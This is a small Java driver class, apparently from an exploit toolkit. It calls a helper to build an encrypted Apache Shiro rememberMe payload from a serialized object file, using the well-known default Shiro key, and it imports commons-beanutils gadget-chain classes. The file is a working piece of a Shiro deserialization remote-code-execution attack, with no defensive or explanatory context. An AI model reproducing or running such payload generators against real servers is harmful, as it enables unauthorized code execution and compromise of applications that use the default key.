package com.sorry.utils;


import com.sorry.utils.bytesandfiles.TransforBytes;
import com.sorry.utils.cipher.rememberMeUtil;
import org.apache.commons.beanutils.BeanComparator;

import java.util.Base64;
import java.util.PriorityQueue;

/**
 * created by 0x22cb7139 on 2021/6/24
 */
public class Debug {
    public static void main(String[] args) throws Exception {
        System.out.println(rememberMeUtil.GeneratePayload("/Users/0x22cb7139/Desktop/k.ser","kPH+bIxk5D2deZiIxcaaaA=="));
    }
}
